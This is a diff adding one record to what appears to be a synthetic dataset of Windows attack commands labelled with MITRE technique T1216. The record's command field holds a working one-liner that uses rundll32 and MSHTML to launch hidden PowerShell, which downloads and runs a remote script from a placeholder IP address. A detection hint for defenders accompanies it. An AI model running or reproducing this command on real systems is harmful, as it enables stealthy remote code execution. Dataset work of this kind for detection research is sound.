@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1216",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "rundll32.exe vbscript:\"\\..\\mshtml,RunHTMLApplication \";CreateObject(\"WScript.Shell\").Run \"powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.20/init.ps1')\"",
+  "explanation": "Leverages the VBScript entry into MSHTML via rundll32 to proxy into a hidden PowerShell stager. The proxy relies on trusted components, aiding control bypass.",
+  "rationale_steps": [
+    "From PowerShell, call rundll32 to run MSHTML via VBScript handler.",
+    "Use WScript.Shell to start a hidden PowerShell process that downloads and executes a remote script.",
+    "Abuses trusted binaries for proxy execution; defenders should flag VBScript/MSHTML exports paired with network pulls."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1216-fce25ec9-69dd0d5d",
+  "source_prompt_hash": "fce25ec9",
+  "timestamp_utc": "2025-09-30T07:05:43.585605Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
